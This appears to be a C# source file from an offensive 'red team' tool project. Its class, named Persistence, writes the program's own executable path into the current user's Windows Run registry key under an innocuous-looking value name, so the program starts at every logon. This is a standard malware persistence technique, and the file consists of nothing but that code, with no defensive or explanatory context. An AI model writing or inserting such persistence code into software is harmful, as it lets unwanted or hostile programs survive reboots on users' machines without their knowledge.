// See https://aka.ms/new-console-template for more information

using System;

namespace redTeamDev;

    class Persistence
    {
        GeneralInfo newInstance;
        public void AddToStartup(){

            Microsoft.Win32.RegistryKey rkInstance = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",true);
            rkInstance.SetValue("painal", newInstance.ePath);
            rkInstance.Dispose();
            rkInstance.Close();

        }

    public Persistence(GeneralInfo instance)
    {
        newInstance = instance;
    }
    }

